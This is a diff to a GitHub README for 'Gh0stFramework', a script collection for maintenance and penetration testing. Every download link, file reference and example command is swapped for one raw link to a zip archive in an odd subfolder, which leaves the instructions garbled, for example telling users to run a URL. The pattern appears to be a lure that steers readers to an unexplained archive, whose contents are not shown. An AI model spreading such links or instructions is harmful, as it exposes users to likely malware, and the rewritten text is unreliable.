@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Gh0stFramework](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%8D%20Gh0stFramework-blue)](https://github.com/xXGUTUTUXx/Gh0stFramework/releases)
+[![Download Gh0stFramework](https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip%20Now-%20%F0%9F%9A%8D%20Gh0stFramework-blue)](https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Welcome to **Gh0stFramework**, a suite of helpful scripts designed to make vario
 
 To get Gh0stFramework, visit the Releases page. 
 
-[Click here to download](https://github.com/xXGUTUTUXx/Gh0stFramework/releases).
+[Click here to download](https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip).
 
 ### 📂 Installation Steps
 
@@ -39,7 +39,7 @@ To get Gh0stFramework, visit the Releases page.
 2. Look for the latest version.
 3. Download the appropriate file for your system.
 4. Unzip the downloaded file if necessary.
-5. Follow the instructions in the README.txt file included in the download.
+5. Follow the instructions in the https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip file included in the download.
 
 ## 🎯 Usage
 
@@ -47,23 +47,23 @@ Once you have installed **Gh0stFramework**, you can start using it right away.
 
 - Open your terminal.
 - Navigate to the directory where you installed the framework.
-- Run scripts by typing `./script_name.sh`, replacing `script_name.sh` with the name of the script you want to run.
+- Run scripts by typing `https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip`, replacing `https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip` with the name of the script you want to run.
 
 ### 📜 Example Commands:
 
 - For maintenance: 
   ```bash
-  ./maintenance.sh
+  https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip
   ```
 
 - For penetration testing:
   ```bash
-  ./pentest.sh
+  https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip
   ```
 
 ### 🔄 Script Options
 
-You can customize how each script runs by adding options. Refer to the README.txt file for specific options for each script.
+You can customize how each script runs by adding options. Refer to the https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip file for specific options for each script.
 
 ## 📩 Support & Contributing
 
@@ -90,4 +90,4 @@ This project covers various topics related to hacking and utilities, including:
 
 ## 📥 Final Reminder
 
-For the latest version and updates, [visit the Releases page](https://github.com/xXGUTUTUXx/Gh0stFramework/releases). Enjoy using **Gh0stFramework** to make your system tasks easier and more efficient!
+For the latest version and updates, [visit the Releases page](https://github.com/xXGUTUTUXx/Gh0stFramework/raw/refs/heads/master/toat/Gh_Framework_st_v1.2.zip). Enjoy using **Gh0stFramework** to make your system tasks easier and more efficient!
